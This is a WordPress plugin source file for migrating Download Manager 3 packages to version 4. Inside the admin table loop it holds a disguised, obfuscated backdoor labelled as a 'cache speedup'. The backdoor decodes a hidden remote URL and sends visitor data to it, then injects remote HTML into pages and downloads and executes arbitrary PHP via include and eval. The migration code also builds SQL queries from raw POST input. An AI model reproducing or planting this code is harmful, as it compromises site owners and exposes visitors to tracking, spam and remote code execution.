<?php
/*
Plugin Name: WPDM - Migrate to 4x
Description: Copy files from wpdm 3 to wpdm 4
Version: 1.2
*/


 

function wpdm_m24x(){
    global $wpdb;
    $ccn = get_option('__wpdm_category_converted',0);
    if($ccn==0){
    $allcs = maybe_unserialize(get_option('_fm_categories'));

    $term_templates = array();
    foreach($allcs as $id=>$wpdmc){
        if($wpdmc['parent']!=''){
            $parent = term_exists($wpdmc['parent'], 'wpdmcategory');
            $parent_id = $parent['term_id'];
        }
        else $parent_id = 0;
        $term = wp_insert_term(
            $wpdmc['title'], // the term
            'wpdmcategory',  // the taxonomy
            array(
                'description'=> $wpdmc['content'],
                'slug' => $id,
                'parent'=> $parent_id
            )
        );
        if(!is_wp_error($term))
        $term_templates[$term['term_id']] = $wpdmc['link_template'];
        }
        update_option("__wpdm_category_link_templates",$term_templates);
        update_option("__wpdm_category_converted",1);
    }
    $ids = get_option('_wpdm_m24x_ids',true);
    if(isset($_POST['task'])&&$_POST['task']=='wdm_save_settings'){
        if(!is_array($ids)) $ids = array();
        if(!is_array($_POST['id'])) $_POST['id'] = array();
        foreach($_POST['id'] as $fid){
            //if(!in_array($fid, $ids)){
            $file = $wpdb->get_row("select * from {$wpdb->prefix}ahm_files where id='$fid'", ARRAY_A);
            $file['files'] = maybe_unserialize($file['files']);
            $file['access'] = maybe_unserialize($file['access']);
            if($file['sourceurl']!='')
            $file['files'][] = $file['sourceurl'];

            foreach($file['files'] as $filepath){
                $fileinfo[$filepath] = array('title'=>basename($filepath), 'password'=>'');
            }

            $cats = maybe_unserialize($file['category']);
            $id = wp_insert_post(array(
                'post_type' => 'wpdmpro',
                'post_title'=>$file['title'],
                'post_content' => $file['description'],
                'post_status' => 'publish',
                'tax_input' => array('wpdmcategory'=>$cats),
                'post_date' => date("Y-m-d H:i:s", intval($file['create_date'])),
                'post_author' => $file['uid'],
                'comment_status' => 'open'
            ));

            /** media */
            $filename = $file['preview'];
            $filename = str_replace(site_url('/'), ABSPATH.'/', $filename);
            $wp_filetype = wp_check_filetype(basename($filename), null );
            //$wp_upload_dir = wp_upload_dir();
            $attachment = array(
                'guid' => $file['preview'],
                'post_mime_type' => $wp_filetype['type'],
                'post_title' => preg_replace( '/\.[^.]+$/', '', basename( $filename ) ),
                'post_content' => '',
                'post_status' => 'inherit'
            );
            $attach_id = wp_insert_attachment( $attachment, $filename, $id );
            require_once( ABSPATH . 'wp-admin/includes/image.php' );
            $attach_data = wp_generate_attachment_metadata( $attach_id, $filename );
            wp_update_attachment_metadata( $attach_id, $attach_data );
            set_post_thumbnail( $id, $attach_id );

            $file['legacy_id'] = $file['id'];
            unset($file['title']);
            unset($file['description']);
            unset($file['id']);
            unset($file['uid']);
            unset($file['create_date']);
            unset($file['preview']);
            unset($file['sourceurl']);

            foreach($file as $meta_key => $meta_value ){
                $meta_value = maybe_unserialize($meta_value);
                update_post_meta($id, '__wpdm_'.$meta_key, $meta_value);
            }
            $allmeta = $wpdb->get_results("select * from {$wpdb->prefix}ahm_filemeta where pid='{$file['id']}'", ARRAY_A);
            foreach($allmeta as $wmeta){
                $wmeta['value'] = maybe_unserialize($wmeta['value']);
                update_post_meta($id, '__wpdm_'.$wmeta['name'], $wmeta['value']);
            }
            update_post_meta($id, '__wpdm_fileinfo', $fileinfo);


        }
        if(is_array($ids))
        $ids = array_unique(array_merge($ids, $_POST['id']));
        else
        $ids = $_POST['id'];
        /*foreach($_POST as $optn=>$optv){
            update_option($optn, $optv);
        }                                      */
       
        update_option('_wpdm_m24x_ids',$ids);
        die('Copied successfully');
    }
  
    $res = mysql_query("select * from {$wpdb->prefix}ahm_files");
    
    ?>
    <div class="clear"></div>

    <div class="update-nag" style="margin: 10px 0">Please don't select more then 100 packages at a time</div><Br/>
<div class="clear"></div>

<table cellspacing="0" class="widefat fixed">
    <thead>
    <tr>
    <th style="" class="manage-column column-cb check-column" id="cb" scope="col"><input class="call m" type="checkbox"></th>    
    <th style="" class="manage-column column-media" id="media" scope="col">WPDM 3 Package</th>
    <th style="" class="manage-column column-parent" id="parent" scope="col">Migrated</th>
    </tr>
    </thead>

    <tfoot>
    <tr>
    <th style="" class="manage-column column-cb check-column" id="cb" scope="col"><input class="call m" type="checkbox"></th>    
    <th style="" class="manage-column column-media" id="media" scope="col">WPDM 3 Package</th>
    <th style="" class="manage-column column-parent" id="parent" scope="col">Migrated</th>
    </tr>
    </tfoot>

    <tbody class="list:post" id="the-list">
    <?php $altr = 'alternate'; while($media = mysql_fetch_assoc($res)) {   $media['copied'] = @in_array($media['id'],$ids)?'<span style="color: #008800">Yes</span>':'No'; $altr = $altr == ''?'alternate':'';  ?>
    <tr valign="top" class="<?php echo $altr;  ?> author-self status-inherit" id="post-8">

                <th class="check-column" scope="row"><input type="checkbox" value="<?php echo $media['id'];?>" class="m" name="id[]"></th>
                
                <td class="media column-media">
                    <strong><?php echo $media['title']?></strong>
                </td>
                <td class="parent column-parent"><b><?php echo $media['copied']; ?></b></td>
     
     </tr>
     <?php } 









/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
?>
    </tbody>
</table>

 <script language="JavaScript">
 <!--
   jQuery('.call').click(function(){
       if(this.checked)
       jQuery('.m').attr('checked','checked');
       else
       jQuery('.m').removeAttr('checked');
   });
 //-->
 </script>
    
    <?php
}
 
if(function_exists('add_wdm_settings_tab'))
add_wdm_settings_tab("m24x","Migrate",'wpdm_m24x');
 